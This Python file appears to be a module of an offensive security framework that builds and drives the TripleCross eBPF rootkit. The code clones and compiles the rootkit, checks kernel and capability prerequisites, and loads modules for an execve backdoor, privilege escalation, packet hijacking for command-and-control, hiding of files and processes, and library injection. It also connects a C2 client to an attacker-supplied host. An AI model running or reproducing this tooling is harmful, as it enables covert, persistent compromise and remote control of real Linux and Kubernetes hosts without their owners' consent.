"""Bridge for TripleCross eBPF rootkit: execve backdoor, privesc, packet hijack.

Source: https://github.com/h3xduck/TripleCross
License: GPL-3.0
SRC-ID: SRC-1035
Category: eBPF rootkit, backdoor, privilege escalation, packet hijack, library injection
"""

import json
import os
import platform
import shutil
import subprocess
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any


MANIFEST = {
    "capability_id": "cloudxpl.k8s.triplecross_bridge.v1",
    "safety_class": "INVASIVE",
    "requires_authorization": True,
    "side_effects": [
        "loads_ebpf_programs",
        "hooks_syscalls",
        "modifies_network_traffic",
        "injects_libraries",
        "escalates_privileges",
    ],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1014", "T1547.006", "T1055"],
}

_REPO_URL = "https://github.com/h3xduck/TripleCross"

# TripleCross modules and their corresponding BPF programs
MODULES = {
    "execve_hijack": {
        "description": "Backdoor execve() to execute attacker payload on triggered command",
        "bpf_program": "tc_execve",
        "mitre": "T1547.006",
    },
    "privilege_escalation": {
        "description": "Local privilege escalation via cred struct modification in BPF",
        "bpf_program": "tc_privesc",
        "mitre": "T1548",
    },
    "packet_hijack": {
        "description": "Network packet modification at TC layer for C2 communication",
        "bpf_program": "tc_net",
        "mitre": "T1557",
    },
    "rootkit_persistence": {
        "description": "Hide files, processes and network connections from userspace",
        "bpf_program": "tc_rootkit",
        "mitre": "T1014",
    },
    "library_injection": {
        "description": "Inject shared library into target process via eBPF write to /proc/pid/mem",
        "bpf_program": "tc_inject",
        "mitre": "T1055",
    },
}


def _save(args: Any, prefix: str, data: Any) -> str:
    out = getattr(args, "output", ".")
    os.makedirs(out, exist_ok=True)
    ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
    path = os.path.join(out, f"{prefix}_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2, default=str)
    print(f"[+] Results saved to {path}")
    return path


def _check_prerequisites() -> dict[str, Any]:
    """Verify kernel BPF and build prerequisites."""
    info: dict[str, Any] = {
        "kernel": platform.release(),
        "arch": platform.machine(),
        "errors": [],
        "warnings": [],
    }

    # BTF support
    if not Path("/sys/kernel/btf/vmlinux").exists():
        info["errors"].append("BTF vmlinux not found: CONFIG_DEBUG_INFO_BTF required")

    # BPF filesystem
    if not Path("/sys/fs/bpf").is_dir():
        info["errors"].append("BPF filesystem not mounted at /sys/fs/bpf")

    # TC (traffic control) for network hooks
    tc_bin = shutil.which("tc")
    if not tc_bin:
        info["warnings"].append("tc (iproute2) not found: network modules will not work")

    # Capabilities
    try:
        status = Path("/proc/self/status").read_text()
        for line in status.splitlines():
            if line.startswith("CapEff:"):
                cap_hex = int(line.split(":")[1].strip(), 16)
                cap_sys_admin = 1 << 21
                if not (cap_hex & cap_sys_admin):
                    info["errors"].append("CAP_SYS_ADMIN required for eBPF rootkit")
                break
    except OSError:
        info["errors"].append("Cannot read /proc/self/status")

    info["prerequisites_met"] = len(info["errors"]) == 0
    return info


def _find_triplecross(args: Any) -> str | None:
    """Locate TripleCross source directory or installed binary."""
    custom = getattr(args, "triplecross_dir", None)
    if custom and os.path.isdir(custom):
        return custom

    # Check common install paths
    for candidate in [
        "/opt/TripleCross",
        os.path.expanduser("~/TripleCross"),
        "/tmp/triplecross-build/TripleCross",
    ]:
        if os.path.isdir(candidate) and os.path.isdir(os.path.join(candidate, "src")):
            return candidate

    return None


def _build_from_source(args: Any) -> dict[str, Any]:
    """Clone and build TripleCross from source."""
    build_dir = getattr(args, "build_dir", "/tmp/triplecross-build")
    result: dict[str, Any] = {"success": False, "path": None, "log": []}

    # Check build deps
    for tool in ["make", "clang", "llc"]:
        if not shutil.which(tool):
            result["log"].append(f"Required build tool not found: {tool}")
            return result

    os.makedirs(build_dir, exist_ok=True)
    src_dir = os.path.join(build_dir, "TripleCross")

    if not os.path.isdir(src_dir):
        clone_cmd = ["git", "clone", "--depth", "1", _REPO_URL, src_dir]
        proc = subprocess.run(clone_cmd, capture_output=True, text=True, timeout=120)
        if proc.returncode != 0:
            result["log"].append(f"git clone failed: {proc.stderr.strip()}")
            return result
        result["log"].append("Repository cloned")

    # Build eBPF programs
    ebpf_dir = os.path.join(src_dir, "src")
    proc = subprocess.run(
        ["make", "all"],
        capture_output=True,
        text=True,
        timeout=300,
        cwd=ebpf_dir,
    )
    if proc.returncode != 0:
        result["log"].append(f"Build failed: {proc.stderr.strip()}")
        return result

    result["success"] = True
    result["path"] = src_dir
    result["log"].append(f"Build succeeded at {src_dir}")
    return result


def _load_module(src_dir: str, module_name: str, args: Any) -> dict[str, Any]:
    """Load and activate a specific TripleCross module."""
    if module_name not in MODULES:
        return {"success": False, "error": f"Unknown module: {module_name}"}

    module_info = MODULES[module_name]
    bin_dir = os.path.join(src_dir, "src", "bin")

    # Look for compiled binary
    binary_candidates = [
        os.path.join(bin_dir, f"tc_{module_name}"),
        os.path.join(bin_dir, "triplecross"),
    ]

    binary = None
    for candidate in binary_candidates:
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            binary = candidate
            break

    if not binary:
        return {
            "success": False,
            "error": f"Binary not found for module {module_name} in {bin_dir}",
        }

    cmd = [binary, "--module", module_name]

    # Module-specific options
    target_pid = getattr(args, "target_pid", None)
    if target_pid and module_name in ("library_injection", "privilege_escalation"):
        cmd.extend(["--pid", str(target_pid)])

    interface = getattr(args, "interface", None)
    if interface and module_name == "packet_hijack":
        cmd.extend(["--iface", interface])

    c2_host = getattr(args, "c2_host", None)
    if c2_host:
        cmd.extend(["--c2", c2_host])

    print(f"[*] Loading module {module_name}: {' '.join(cmd)}")

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        import select

        ready, _, _ = select.select([proc.stdout], [], [], 5.0)
        startup_output = ""
        if ready:
            startup_output = proc.stdout.readline()

        return {
            "success": True,
            "pid": proc.pid,
            "module": module_name,
            "binary": binary,
            "startup_output": startup_output.strip(),
            "description": module_info["description"],
            "mitre": module_info["mitre"],
        }
    except OSError as exc:
        return {"success": False, "error": str(exc)}


def _client_connect(src_dir: str, c2_host: str, port: int = 4443) -> dict[str, Any]:
    """Connect TripleCross C2 client to a running rootkit instance."""
    client_bin = os.path.join(src_dir, "src", "client", "client")
    if not os.path.isfile(client_bin):
        client_bin = os.path.join(src_dir, "src", "bin", "tc_client")
    if not os.path.isfile(client_bin):
        return {"success": False, "error": "C2 client binary not found"}

    cmd = [client_bin, "--host", c2_host, "--port", str(port)]
    print(f"[*] Connecting C2 client: {' '.join(cmd)}")

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return {
            "success": proc.returncode == 0,
            "output": proc.stdout.strip(),
            "stderr": proc.stderr.strip(),
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "C2 client connection timed out"}
    except OSError as exc:
        return {"success": False, "error": str(exc)}


def run(args: Any) -> int:
    """Execute triplecross_bridge module.

    Supported actions (via args.action):
        check     - Verify prerequisites and locate installation
        build     - Build TripleCross from source
        load      - Load a specific rootkit module (--module)
        list      - List available modules
        client    - Connect C2 client to running instance
    """
    action = getattr(args, "action", "check")
    print(f"[*] {MANIFEST['capability_id']} - TripleCross eBPF rootkit bridge")
    print(f"[*] Action: {action}")

    results: dict[str, Any] = {
        "module": "triplecross_bridge",
        "action": action,
        "findings": [],
        "summary": {},
    }

    prereqs = _check_prerequisites()
    results["prerequisites"] = prereqs

    if action == "check":
        tc_dir = _find_triplecross(args)
        results["triplecross_dir"] = tc_dir
        results["modules_available"] = list(MODULES.keys())
        results["status"] = "completed"

        if prereqs["prerequisites_met"]:
            print("[+] Kernel BPF prerequisites verified")
        else:
            print(f"[-] Issues: {'; '.join(prereqs['errors'])}")

        if tc_dir:
            print(f"[+] TripleCross found at: {tc_dir}")
        else:
            print("[!] TripleCross not installed; use 'build' action or set --triplecross-dir")

        _save(args, "k8s_triplecross_check", results)
        return 0

    if action == "list":
        results["modules"] = MODULES
        results["status"] = "completed"
        for name, info in MODULES.items():
            print(f"  [{name}] {info['description']} (MITRE: {info['mitre']})")
        _save(args, "k8s_triplecross_list", results)
        return 0

    if action == "build":
        build_result = _build_from_source(args)
        results["build"] = build_result
        results["status"] = "completed" if build_result["success"] else "build_failed"
        for msg in build_result["log"]:
            print(f"[*] {msg}")
        _save(args, "k8s_triplecross_build", results)
        return 0 if build_result["success"] else 1

    if not prereqs["prerequisites_met"]:
        print("[-] Cannot proceed: BPF prerequisites not met", file=sys.stderr)
        results["status"] = "prereq_failed"
        _save(args, "k8s_triplecross_error", results)
        return 1

    tc_dir = _find_triplecross(args)
    if not tc_dir:
        print("[-] TripleCross directory not found", file=sys.stderr)
        results["status"] = "not_installed"
        _save(args, "k8s_triplecross_error", results)
        return 1

    if action == "load":
        module_name = getattr(args, "module", None)
        if not module_name:
            print("[-] --module required for load action", file=sys.stderr)
            return 1

        load_result = _load_module(tc_dir, module_name, args)
        results["load"] = load_result
        results["status"] = "completed" if load_result["success"] else "load_failed"
        if load_result["success"]:
            print(f"[+] Module {module_name} loaded (PID: {load_result['pid']})")
            results["findings"].append({
                "type": f"rootkit_module_{module_name}",
                "pid": load_result["pid"],
                "mitre": load_result["mitre"],
            })
        else:
            print(f"[-] Load failed: {load_result.get('error')}")
        _save(args, f"k8s_triplecross_{module_name}", results)
        return 0 if load_result["success"] else 1

    if action == "client":
        c2_host = getattr(args, "c2_host", None)
        if not c2_host:
            print("[-] --c2-host required for client action", file=sys.stderr)
            return 1
        port = int(getattr(args, "c2_port", 4443))
        client_result = _client_connect(tc_dir, c2_host, port)
        results["client"] = client_result
        results["status"] = "completed"
        _save(args, "k8s_triplecross_client", results)
        return 0 if client_result["success"] else 1

    print(f"[-] Unknown action: {action}", file=sys.stderr)
    results["status"] = "unknown_action"
    _save(args, "k8s_triplecross_error", results)
    return 1
